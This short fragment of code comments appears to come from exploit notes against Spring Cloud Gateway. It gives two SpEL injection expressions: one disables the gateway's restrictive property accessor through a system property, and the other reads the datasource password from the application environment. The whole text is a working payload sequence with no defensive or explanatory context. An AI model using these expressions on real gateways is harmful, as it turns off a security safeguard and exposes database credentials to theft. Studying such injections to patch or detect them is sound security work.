// Step 1: Disable restrictive mode via SpEL route filter
// #{@systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = false}
// Step 2: Full StandardEvaluationContext access
// #{@environment.getProperty('spring.datasource.password')}
